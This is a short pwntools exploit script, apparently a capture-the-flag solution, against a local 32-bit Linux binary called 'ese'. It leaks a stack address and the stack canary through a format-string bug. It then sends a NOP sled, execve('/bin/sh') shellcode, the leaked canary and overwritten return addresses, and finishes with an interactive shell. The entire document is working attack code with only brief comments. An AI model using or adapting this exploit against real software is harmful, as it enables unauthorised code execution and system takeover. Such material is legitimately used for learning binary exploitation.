from pwn import *

context(terminal=['tmux','new-window']) # comment this line if you don't use tmux

context.update(arch='i386',os='linux')

fname = './ese'

r = process(fname)
p = ELF(fname)

shellcode = b'\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'


if __name__=='__main__':
	r.recvline()
	r.sendline('%3$lx,%65$lx') # leak a stack address with a fixed offset from s1, and canary
	r.recvline()
	info = r.recvline().strip().decode()
	log.info(info)
	r.recvline()


	s1_addr = int(info.split(',')[0],16)+42 # in my case the leaked address was 42 byte before s1
	canary = int(info.split(',')[1],16)

	log.info('canary is {}'.format(hex(canary)))
	log.info('s1 @ {}'.format(hex(s1_addr)))

	
	r.sendline('USELESS') # the second gets is useless for this exploit
	
	log.info(r.recvuntil('!'))
	log.info(r.recvuntil('!'))	
	r.sendline(b'\x90'*(250-len(shellcode))+shellcode+p32(canary)+b'JUNK'+b'JUNK'+p32(s1_addr)*3)
				
	r.interactive()	








